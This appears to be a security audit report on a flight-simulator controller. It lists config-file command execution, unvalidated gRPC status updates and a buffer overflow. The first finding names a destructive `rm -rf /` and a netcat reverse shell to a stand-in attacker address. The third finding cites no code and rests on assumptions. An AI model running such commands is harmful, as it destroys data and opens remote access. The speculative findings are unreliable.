## Combined Vulnerability List

- **Vulnerability Name:** Unvalidated Configuration File Leading to Arbitrary Command Execution

  - **Description:**
    1. An attacker crafts a malicious `config.protoascii` file.
    2. This malicious configuration file is placed on the server machine.
    3. The Flight Lab controller server reads and parses this malicious configuration file during startup or reconfiguration.
    4. The malicious configuration file defines a `CommandLineComponent` with malicious commands in the `when_on` or `when_off` fields.
    5. When the controller server starts or when a system command triggers the malicious component (e.g., system start/stop), the arbitrary commands are executed on the server machine.

  - **Impact:** Arbitrary command execution on the server machine. This can lead to complete system compromise, data exfiltration, installation of malware, or denial of service.

  - **Vulnerability Rank:** Critical

  - **Currently Implemented Mitigations:** None. The code parses the configuration file using protobuf's `text_format.Merge`, which does not inherently validate the contents for security implications like command injection.

  - **Missing Mitigations:**
    - Input validation and sanitization for the `config.protoascii` file, specifically for fields that are used to execute commands, such as the `when_on` and `when_off` lists in `CommandLineComponent`. A whitelist of allowed commands or parameters, or a secure way to define allowed operations, should be implemented.
    - Principle of least privilege: Ensure the controller server and client applications run with the minimum necessary privileges to reduce the impact of successful exploits.
    - Integrity checks for the configuration file to detect unauthorized modifications.

  - **Preconditions:**
    - The attacker must be able to place a malicious `config.protoascii` file on the server machine. This could be achieved through various means, such as exploiting other vulnerabilities in the system (if any), social engineering, or physical access to the server.

  - **Source Code Analysis:**
    1. **Configuration Loading (`/code/controller/main.py`)**: The `ControllerApp` class in `main.py` loads the system configuration from the `config.protoascii` file using `text_format.Merge`.
    ```python
    FLAGS = gflags.FLAGS
    gflags.DEFINE_string('config', 'config.protoascii',
                         'Path to system configuration file.')
    class ControllerApp(pattern.Logger, appcommands.Cmd):
        def __init__(self, *args, **kwargs):
            super(ControllerApp, self).__init__(*args, **kwargs)
            # ...
            self._system_config = controller_pb2.System()
            with open(FLAGS.config, 'r') as f:
              config_text = f.read()
              text_format.Merge(config_text, self._system_config)
    ```
    This code reads the configuration file specified by the `--config` flag and parses it into a `controller_pb2.System` protobuf object.

    2. **CommandLineComponent Execution (`/code/controller/components/app.py`)**: The `CommandLineComponent` in `app.py` directly executes commands defined in the configuration using `subprocess.call`.
    ```python
    class CommandLineComponent(base.Component):
      def _start(self):
        for cmd in self.settings.when_on:
          self.logger.info('[{0}] Running: {1}'.format(self.name, cmd))
          ret = subprocess.call(cmd)
          self.logger.info('[{0}] Done (return code={1})'.format(self.name, ret))

      def _stop(self):
        for cmd in self.settings.when_off:
          self.logger.info('[{0}] Running: {1}'.format(self.name, cmd))
          ret = subprocess.call(cmd)
          self.logger.info('[{0}] Done (return code={1})'.format(self.name, ret))
    ```
    The `_start` and `_stop` methods iterate through the `when_on` and `when_off` lists from the component's settings and execute each command using `subprocess.call`. There is no input validation or sanitization on these commands.

    **Visualization**:

    ```
    config.protoascii --> ControllerApp (parses config) --> ComponentFactory (creates components) --> CommandLineComponent

    CommandLineComponent.start() or .stop() --> for cmd in settings.when_on/off: --> subprocess.call(cmd) --> System Command Execution
    ```

    If a malicious user can modify `config.protoascii` to include commands like `rm -rf /` or `nc -e /bin/bash attacker_ip port` within a `CommandLineComponent`, and the server is started with this modified configuration, these commands will be executed when the component is initialized or triggered (e.g., on system start or stop).

  - **Security Test Case:**
    1. **Prepare Malicious Configuration File**: Create a file named `malicious_config.protoascii` with the following content. This configuration defines a `CommandLineComponent` that will create a file `/tmp/flightlab_pwned.txt` when the component is started.
    ```
    machines: [
      {
        name: "master"
        ip: "127.0.0.1"
        components: [
          {
            name: "malicious_command"
            type: COMMANDLINE
            commandline: {
              when_on: ["touch /tmp/flightlab_pwned.txt"]
            }
          }
        ]
      }
    ]
    master_machine_name: "master"
    ```
    2. **Replace Configuration File**: Assume you have a way to replace the legitimate `config.protoascii` with `malicious_config.protoascii` on the server machine. For testing purposes, you might manually replace the file. In a real attack scenario, this might involve exploiting another vulnerability or social engineering.
    3. **Start Controller Server**: Run the controller server application, pointing it to the malicious configuration file:
    ```sh
    python main.py server --config malicious_config.protoascii
    ```
    4. **Trigger Component Start**: Send a system start command to the server, for example, by using `curl` to access the `/system/on` API endpoint (if the HTTP API is enabled and accessible) or by any other mechanism that triggers the `START` system command.
    ```sh
    curl http://<server_ip>:8080/system/on
    ```
    5. **Verify Command Execution**: Check if the file `/tmp/flightlab_pwned.txt` has been created on the server machine.
    ```sh
    ls /tmp/flightlab_pwned.txt
    ```
    If the file exists, it confirms that the arbitrary command defined in the malicious configuration file was executed by the `CommandLineComponent`, demonstrating the vulnerability.

- **Vulnerability Name:** Missing Input Validation in Component Status Updates

  - **Description:**
    1. An attacker compromises a client machine or simulates a malicious client capable of sending gRPC messages to the controller server.
    2. The attacker crafts a malicious `UpdateStatus` gRPC message. This message is designed to include crafted `component_status` data with unexpected or out-of-range values. For example, if a component represents airspeed, the attacker sets the airspeed value to an extremely large or negative number, or injects special characters.
    3. The malicious client sends this crafted `UpdateStatus` message to the controller server via gRPC on the designated port (default port 9000).
    4. The `ControlService` running on the controller server receives the `UpdateStatus` message.
    5. Within `ControlService.UpdateStatus`, the server processes the message and updates the `system_config` with the received component status values. Critically, this update process is performed without proper validation of the content of the `component_status` data. The server only checks if the machine and component names are valid and present in the system configuration.
    6. The system configuration, now potentially containing these invalid status values, is used to drive the flight simulation. It is assumed that these status values are eventually transmitted to and utilized by the firmware controlling the hardware components of the simulator.
    7. If the firmware, upon receiving these status values, does not perform adequate input validation, it becomes vulnerable to memory corruption. For instance, processing extremely large numbers or unexpected characters could lead to buffer overflows or other memory-related errors within the firmware.
    8. By successfully exploiting this lack of validation, an attacker can potentially induce memory corruption in the firmware, leading to unpredictable behavior, system crashes, or, in a worst-case scenario, gain control over the flight simulation system's firmware and consequently the physical simulator itself.

  - **Impact:**
    - Memory corruption in the firmware of the flight simulation system.
    - Potential for unauthorized control over the flight simulation system.
    - System instability, leading to crashes or unpredictable and erroneous simulation behavior.
    - Possible exploitation to bypass security measures and manipulate the simulation environment for malicious purposes.

  - **Vulnerability Rank:** High

  - **Currently Implemented Mitigations:** None. The source code analysis of `ControlService.UpdateStatus` in `/code/controller/controller.py` reveals no input validation on the content of the `component_status` messages. The server only validates the existence of machine and component names, not the data itself.

  - **Missing Mitigations:**
    - Implementation of robust input validation within the `ControlService.UpdateStatus` function on the server side. This validation should include checks for:
      - Range validation: Ensuring that received status values fall within expected and safe ranges for each component type (e.g., airspeed, heading, etc.).
      - Format validation: Verifying that the format of the received data conforms to expected types and structures, guarding against injection of unexpected data types or special characters.
    - Implementation of input validation within the firmware itself. Regardless of server-side validation, the firmware should independently validate all incoming data from any source, including the controller server, before processing or utilizing it to control hardware or simulation parameters. This defense-in-depth approach is critical to prevent memory corruption at the firmware level, even if validation is bypassed or missed at higher levels.

  - **Preconditions:**
    - The attacker must have the ability to send gRPC messages to the controller server. This can be achieved by:
      - Compromising a machine that is already authorized to act as a client in the Flight Lab system.
      - Simulating a malicious client on the network if the gRPC control service port (default 9000) is exposed and accessible from the attacker's network.

  - **Source Code Analysis:**
    - File: `/code/controller/controller.py`
    - Function: `ControlService.UpdateStatus(self, machine_status, context)`
    - Step-by-step analysis:
      1. The `UpdateStatus` function is invoked when the gRPC server receives an `UpdateStatus` message from a client.
      2. The function first attempts to locate the machine within the `_system_config.machines` list based on the `machine_status.name`. If the machine is not found, a warning is logged, and the function returns.
      3. The code then iterates through each `component_status` within the received `machine_status.component_status` list.
      4. For each `component_status`, it attempts to find the corresponding component in the `machine.components` list based on `component_status.name`. If the component is not found, a warning is logged, and the loop continues to the next `component_status`.
      5. If both machine and component are found, an informational log message is generated, indicating a status update.
      6. The code retrieves the actual status value from the `component_status` based on its 'kind' (e.g., `projector_status`, `app_status`).
      7. It then retrieves the settings of the corresponding component from the `system_config`, again based on its 'kind'.
      8. Finally, it updates the `settings.status` and `component.status` with the received status value.
      9. **Crucially, there is no validation performed on the `status` value itself before it is assigned to `settings.status`. The code directly assigns the received value without checking its range, format, or validity.**

  - **Security Test Case:**
    1. **Deploy the Flight Lab system**, ensuring both the controller server and at least one client are running. Identify the IP address of the server.
    2. **Install the `protobuf` and `grpc` Python libraries** in a testing environment that can communicate with the controller server.
    3. **Create a Python script to act as a malicious gRPC client.** This script will:
        - Import necessary gRPC and protobuf libraries for `sim_proxy_pb2`, `sim_proxy_pb2_grpc`, `controller_pb2`, and `controller_pb2_grpc`.
        - Establish an insecure gRPC channel to the controller server's IP address and port 9000.
        - Create a gRPC stub for the `ControlService`.
        - Construct an `UpdateStatus` request message (`controller_pb2.MachineStatus`). This message should include:
          - `machine_status.name`: Set to the name of a valid machine from your `config.protoascii` (e.g., 'client').
          - `component_status`: Create a `controller_pb2.ComponentStatus` message within this list.
            - `component_status.name`: Set to the name of a component that handles numerical data.
            - Set the status value within `component_status` to an out-of-range value. For example, if component type is 'app', you would set `component_status.app_status.status = "A" * 2000`.
        - Use the gRPC stub to call `UpdateStatus` on the server, sending the crafted `MachineStatus` message.
    4. **Execute the malicious client script.**
    5. **Monitor the controller server logs for errors or warnings.** Observe the behavior of the Flight Lab system. Check for any signs of instability, crashes, or unexpected behavior. If you have access to firmware logs or debugging tools, monitor those for indications of memory corruption or errors when processing the status update.

- **Vulnerability Name:** Buffer Overflow in Flight Control Input Processing

  - **Description:** An attacker could exploit a buffer overflow vulnerability in the C++ based flight simulation engine when processing flight control inputs. This involves sending specially crafted flight control inputs that exceed the buffer size allocated for processing these inputs in the C++ engine. When the engine attempts to write this oversized input into the buffer, it overflows into adjacent memory regions.

  - **Impact:** Successful exploitation of this buffer overflow vulnerability can lead to arbitrary code execution within the simulation environment. This means an attacker could potentially gain control over the simulation application, modify simulation parameters, inject malicious code, or even escalate privileges within the system running the simulation.

  - **Vulnerability Rank:** Critical

  - **Currently Implemented Mitigations:** Unknown. Based on the description, there are no explicitly mentioned mitigations in place within the provided information. It is assumed that standard buffer overflow prevention techniques are not effectively implemented in the vulnerable code section.

  - **Missing Mitigations:**
    - Input Validation: Lack of proper validation and sanitization of flight control inputs before processing them in the C++ engine. Input validation should include checks to ensure that the size of the input does not exceed the expected buffer size.
    - Bounds Checking: Missing bounds checking during buffer operations in the C++ code. Before writing flight control inputs into the buffer, the code should check if there is sufficient space available to prevent overflow.
    - Safe Memory Management Functions:  Potentially using unsafe C-style string manipulation functions (like `strcpy`, `sprintf`, `strcat`) that are prone to buffer overflows. Replacing these with safer alternatives like `strncpy`, `snprintf`, or using C++ string objects can mitigate this risk.

  - **Preconditions:**
    - The attacker must be able to send flight control inputs to the flight simulation engine. This typically implies network access to the simulation application or the ability to interact with it through an interface that accepts flight control commands.

  - **Source Code Analysis:**
    Detailed source code analysis of the C++ flight simulation engine, specifically the code responsible for processing flight control inputs, is required to pinpoint the exact location of the buffer overflow.
    1. **Identify Input Processing Code:** Locate the C++ code section in the flight simulation engine that receives and processes flight control inputs.
    2. **Analyze Buffer Allocation:** Examine how buffers are allocated to store these inputs. Check the size of the allocated buffers and how input sizes are handled.
    3. **Trace Input Data Flow:** Follow the flow of input data from the point of reception to where it is stored in the buffer. Identify any string manipulation or data copying operations performed on the input data.
    4. **Look for Vulnerable Functions:** Search for usage of potentially unsafe functions like `strcpy`, `sprintf`, `strcat`, `gets`, or manual memory manipulation without bounds checks.
    5. **Verify Lack of Validation:** Confirm the absence or inadequacy of input validation and bounds checking before buffer operations.

  - **Security Test Case:**
    1. **Set up the Flight Simulation Environment:**  Establish a running instance of the Flight Lab simulation application. Ensure that you can interact with it and send flight control inputs.
    2. **Craft Malicious Input:**  Create a series of flight control inputs that are significantly larger than the expected buffer size in the flight control input processing code. This crafted input should be designed to overflow the buffer when processed.
    3. **Send Malicious Input:**  Send the crafted flight control inputs to the running simulation application through the standard input mechanism (e.g., network interface, command-line interface, API).
    4. **Monitor Application Behavior:** Observe the behavior of the simulation application after sending the malicious input. Look for signs of a crash, unexpected program termination, error messages related to memory access violations, or any other abnormal behavior.
    5. **Attempt Code Execution (Exploitation):**  If a crash or abnormal behavior is observed, attempt to refine the malicious input to achieve arbitrary code execution.
    6. **Verify Code Execution:** If successful, demonstrate arbitrary code execution by performing an action within the simulation environment that is not part of the normal application functionality.
    7. **Document Findings:**  Record all steps taken, observations, and evidence of successful buffer overflow exploitation, including crash logs, debugging information, and proof of arbitrary code execution.
